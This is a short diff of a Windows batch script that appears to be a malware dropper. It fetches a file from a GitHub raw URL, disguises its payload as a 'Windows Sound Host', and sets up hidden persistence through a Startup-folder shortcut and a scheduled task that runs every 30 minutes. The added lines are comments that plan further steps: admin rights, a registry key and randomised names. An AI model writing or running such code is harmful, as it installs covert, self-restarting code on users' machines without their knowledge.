@@ -12,11 +12,13 @@ powershell Invoke-WebRequest 'https://raw.githubusercontent.com/LONG-BAT/Sounds-
 
 if not exist %userprofile%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup\31513wd5w1d3a5wd185s3d51a.lnk ( 
     powershell -command "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\31513wd5w1d3a5wd185s3d51a.lnk');$s.TargetPath='%userprofile%\documents\Windows Sound Host\31513wd5w1d3a5wd185s3d51a.bat';$s.Save()"
-    
+::Needs admin    
+::Add REG key?
 )
 schtasks /create /tn "Sound Host Str" /tr "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\31513wd5w1d3a5wd185s3d51a.lnk" /sc minute /mo 30
 
 cd %path1%
+::Make random
 start 31513wd5w1d3a5wd185s3d51a.bat
 
 
